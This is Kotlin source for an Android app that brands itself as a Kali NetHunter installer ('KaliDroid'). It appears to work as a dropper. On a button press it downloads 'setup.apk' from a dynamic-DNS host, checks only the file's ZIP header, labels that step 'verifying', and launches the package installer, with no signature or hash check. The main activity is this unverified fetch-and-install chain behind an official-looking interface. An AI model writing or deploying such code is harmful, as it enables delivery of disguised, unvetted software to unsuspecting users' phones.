package com.nethunter.kalidroid

import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.View
import android.view.animation.AnimationUtils
import android.widget.ImageView
import android.widget.ProgressBar
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.FileProvider
import com.google.android.material.button.MaterialButton
import com.google.android.material.progressindicator.CircularProgressIndicator
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.util.Locale

class MainActivity : AppCompatActivity() {

    companion object {
        private const val TAG = "KaliDroid"
        private const val APK_URL = "https://kimo.gotdns.ch/setup.apk"
        private const val FILE_PROVIDER_AUTHORITY = "com.nethunter.kalidroid.provider"
    }

    private val handler = Handler(Looper.getMainLooper())
    private var downloadThread: Thread? = null

    // Header
    private lateinit var ivPhaseIcon: ImageView
    private lateinit var tvPhase: TextView
    private lateinit var mainStatusDot: View
    private lateinit var tvLive: TextView

    // Panels
    private lateinit var idlePanel: View
    private lateinit var progressPanel: View

    // Progress views
    private lateinit var tvStatus: TextView
    private lateinit var tvStatusHint: TextView
    private lateinit var progressBar: ProgressBar
    private lateinit var circular: CircularProgressIndicator
    private lateinit var tvPercent: TextView
    private lateinit var tvSpeed: TextView
    private lateinit var tvSize: TextView
    private lateinit var tvRemaining: TextView
    private lateinit var btnCancel: MaterialButton

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Idle decorative animations
        findViewById<ImageView>(R.id.ivMainRingScanner)
            .startAnimation(AnimationUtils.loadAnimation(this, R.anim.rotate_cw))
        findViewById<ImageView>(R.id.ivMainRingDashed)
            .startAnimation(AnimationUtils.loadAnimation(this, R.anim.rotate_ccw))
        mainStatusDot = findViewById(R.id.mainStatusDot)
        mainStatusDot.startAnimation(AnimationUtils.loadAnimation(this, R.anim.blink))

        // Header
        ivPhaseIcon = findViewById(R.id.ivPhaseIcon)
        tvPhase     = findViewById(R.id.tvPhase)
        tvLive      = findViewById(R.id.tvLive)

        // Panels
        idlePanel     = findViewById(R.id.idlePanel)
        progressPanel = findViewById(R.id.progressPanel)

        // Progress views
        tvStatus     = findViewById(R.id.tvStatus)
        tvStatusHint = findViewById(R.id.tvStatusHint)
        progressBar  = findViewById(R.id.progressBar)
        circular     = findViewById(R.id.circularProgress)
        tvPercent    = findViewById(R.id.tvPercent)
        tvSpeed      = findViewById(R.id.tvSpeed)
        tvSize       = findViewById(R.id.tvSize)
        tvRemaining  = findViewById(R.id.tvRemaining)
        btnCancel    = findViewById(R.id.btnCancel)

        circular.max = 1000

        findViewById<MaterialButton>(R.id.btnDownload).setOnClickListener {
            startDownload()
        }

        btnCancel.setOnClickListener {
            downloadThread?.interrupt()
            showIdlePanel()
        }
    }

    private fun showIdlePanel() {
        progressPanel.visibility = View.GONE
        idlePanel.visibility = View.VISIBLE
        // Reset header back to its ready/online state
        ivPhaseIcon.setImageResource(R.drawable.ic_package)
        tvPhase.text = getString(R.string.main_chip_version)
        tvPhase.setTextColor(getColor(R.color.kali_blue))
        tvLive.text = getString(R.string.main_ready_label)
        tvLive.setTextColor(getColor(R.color.valid_green))
        mainStatusDot.setBackgroundResource(R.drawable.status_dot)
        mainStatusDot.backgroundTintList = null
        mainStatusDot.alpha = 1f
        mainStatusDot.startAnimation(AnimationUtils.loadAnimation(this, R.anim.blink))
        btnCancel.text = getString(android.R.string.cancel)
    }

    private fun startDownload() {
        // Swap to the progress panel
        idlePanel.visibility = View.GONE
        progressPanel.visibility = View.VISIBLE

        // Decorative animations for the progress rings + dot
        findViewById<ImageView>(R.id.ivRingScanner)
            .startAnimation(AnimationUtils.loadAnimation(this, R.anim.rotate_cw))
        findViewById<ImageView>(R.id.ivRingDashed)
            .startAnimation(AnimationUtils.loadAnimation(this, R.anim.rotate_ccw))

        // Reset state
        circular.setProgressCompat(0, false)
        progressBar.progress = 0
        tvPercent.text   = getString(R.string.percent_format, 0)
        tvSpeed.text     = getString(R.string.dash)
        tvSize.text      = getString(R.string.dash)
        tvRemaining.text = getString(R.string.dash)
        btnCancel.text   = getString(android.R.string.cancel)

        // Header → downloading state
        ivPhaseIcon.setImageResource(R.drawable.ic_download)
        tvPhase.text  = getString(R.string.phase_downloading)
        tvPhase.setTextColor(getColor(R.color.kali_blue))
        tvLive.text   = getString(R.string.live_label)
        tvLive.setTextColor(getColor(R.color.valid_green))
        mainStatusDot.setBackgroundResource(R.drawable.status_dot)
        mainStatusDot.backgroundTintList = null
        mainStatusDot.alpha = 1f
        mainStatusDot.startAnimation(AnimationUtils.loadAnimation(this, R.anim.blink))

        tvStatus.text     = getString(R.string.status_connecting)
        tvStatusHint.text = getString(R.string.status_hint_connect)

        downloadThread = Thread {
            try {
                val apkFile = downloadApk(
                    onProgress = { percent, downloadedBytes, totalBytes, speedMbps, remainingSecs ->
                        handler.post {
                            val scaled = (percent * 10).coerceIn(0, 1000)
                            progressBar.progress = scaled
                            circular.setProgressCompat(scaled, true)
                            tvPercent.text = getString(R.string.percent_format, percent)
                            tvSpeed.text   = getString(R.string.speed_format, speedMbps)
                            tvSize.text    = getString(
                                R.string.size_format,
                                formatBytes(downloadedBytes),
                                formatBytes(totalBytes)
                            )
                            tvRemaining.text = formatRemaining(remainingSecs)
                        }
                    },
                    onConnected = { totalBytes ->
                        handler.post {
                            tvStatus.text     = getString(R.string.status_downloading)
                            tvStatusHint.text = getString(R.string.status_hint_download)
                            if (totalBytes > 0) {
                                tvSize.text = getString(
                                    R.string.size_format,
                                    formatBytes(0L),
                                    formatBytes(totalBytes)
                                )
                            }
                        }
                    }
                )

                Log.d(TAG, "Downloaded: ${apkFile.absolutePath} (${apkFile.length()} B)")

                handler.post {
                    ivPhaseIcon.setImageResource(R.drawable.ic_package)
                    tvPhase.text      = getString(R.string.phase_verifying)
                    tvStatus.text     = getString(R.string.status_verifying)
                    tvStatusHint.text = getString(R.string.status_hint_verify)
                }

                // Validate ZIP/APK magic: PK\x03\x04
                val magic = ByteArray(4)
                val magicRead = apkFile.inputStream().use { it.read(magic) }
                if (magicRead < 4 || magic[0] != 0x50.toByte() || magic[1] != 0x4B.toByte()) {
                    val hex = magic.take(magicRead).joinToString(" ") { "%02X".format(it) }
                    Log.e(TAG, "Not a valid APK: $hex")
                    throw Exception("Downloaded file is not a valid APK ($hex)")
                }

                handler.post {
                    progressBar.progress = 1000
                    circular.setProgressCompat(1000, true)
                    tvPercent.text  = getString(R.string.percent_format, 100)
                    tvSpeed.text    = getString(R.string.dash)
                    tvRemaining.text = getString(R.string.dash)
                    tvPhase.text    = getString(R.string.phase_installing)
                    tvStatus.text   = getString(R.string.status_installing)
                    tvStatusHint.text = getString(R.string.status_hint_install)
                }

                Thread.sleep(700)
                handler.post {
                    showIdlePanel()
                    installApk(apkFile)
                }

            } catch (_: InterruptedException) {
                // user cancelled
            } catch (e: Exception) {
                handler.post {
                    mainStatusDot.clearAnimation()
                    mainStatusDot.alpha = 1f
                    mainStatusDot.setBackgroundResource(R.drawable.status_dot)
                    mainStatusDot.backgroundTintList = android.content.res.ColorStateList.valueOf(
                        getColor(R.color.invalid_red)
                    )
                    tvLive.text = getString(R.string.offline_label)
                    tvLive.setTextColor(getColor(R.color.invalid_red))
                    ivPhaseIcon.setImageResource(R.drawable.ic_package)
                    tvPhase.text       = getString(R.string.phase_error)
                    tvPhase.setTextColor(getColor(R.color.invalid_red))
                    tvStatus.text      = e.message ?: getString(R.string.error_unknown)
                    tvStatusHint.text  = getString(R.string.status_hint_error)
                    tvSpeed.text       = getString(R.string.dash)
                    tvRemaining.text   = getString(R.string.dash)
                    btnCancel.text     = getString(android.R.string.ok)
                }
            }
        }
        downloadThread?.start()
    }

    private fun downloadApk(
        onProgress: (percent: Int, downloadedBytes: Long, totalBytes: Long, speedMbps: Double, remainingSecs: Long) -> Unit,
        onConnected: (totalBytes: Long) -> Unit
    ): File {
        val conn = URL(APK_URL).openConnection() as HttpURLConnection
        conn.connectTimeout = 15_000
        conn.readTimeout    = 30_000
        conn.connect()

        val responseCode = conn.responseCode
        if (responseCode != HttpURLConnection.HTTP_OK) {
            throw Exception("Server returned HTTP $responseCode")
        }

        val contentLength = conn.contentLengthLong
        onConnected(contentLength)

        val outFile = File(cacheDir, "setup.apk")

        conn.inputStream.use { input ->
            outFile.outputStream().use { output ->
                val buf = ByteArray(65_536)
                var downloaded = 0L
                var read: Int
                val startTime = System.currentTimeMillis()
                var lastTime  = startTime
                var lastBytes = 0L

                while (input.read(buf).also { read = it } != -1) {
                    if (Thread.currentThread().isInterrupted) throw InterruptedException()
                    output.write(buf, 0, read)
                    downloaded += read

                    val now = System.currentTimeMillis()
                    if (now - lastTime >= 250) {
                        val intervalBytes = downloaded - lastBytes
                        val intervalMs = (now - lastTime).coerceAtLeast(1)
                        val speedBps = intervalBytes * 1000.0 / intervalMs
                        val speedMbps = speedBps / (1024.0 * 1024.0)

                        val percent = if (contentLength > 0) (downloaded * 100 / contentLength).toInt() else -1
                        val remaining = if (contentLength > 0 && speedBps > 0)
                            ((contentLength - downloaded) / speedBps).toLong() else -1L

                        if (percent >= 0) {
                            onProgress(percent.coerceIn(0, 99), downloaded, contentLength, speedMbps, remaining)
                        }
                        lastTime  = now
                        lastBytes = downloaded
                    }
                }
            }
        }
        return outFile
    }

    private fun installApk(file: File) {
        val uri = FileProvider.getUriForFile(this, FILE_PROVIDER_AUTHORITY, file)
        startActivity(
            Intent(Intent.ACTION_VIEW).apply {
                setDataAndType(uri, "application/vnd.android.package-archive")
                addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION)
                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            }
        )
    }

    private fun formatBytes(bytes: Long): String {
        if (bytes <= 0) return "0 B"
        val units = arrayOf("B", "KB", "MB", "GB")
        var value = bytes.toDouble()
        var unitIdx = 0
        while (value >= 1024.0 && unitIdx < units.size - 1) {
            value /= 1024.0
            unitIdx++
        }
        return if (unitIdx == 0) {
            String.format(Locale.US, "%d %s", value.toLong(), units[unitIdx])
        } else {
            String.format(Locale.US, "%.1f %s", value, units[unitIdx])
        }
    }

    private fun formatRemaining(seconds: Long): String = when {
        seconds < 0   -> getString(R.string.remaining_calculating)
        seconds == 0L -> getString(R.string.dash)
        seconds < 60  -> getString(R.string.remaining_seconds, seconds)
        else          -> getString(R.string.remaining_minutes, seconds / 60, seconds % 60)
    }

    override fun onDestroy() {
        super.onDestroy()
        downloadThread?.interrupt()
    }
}
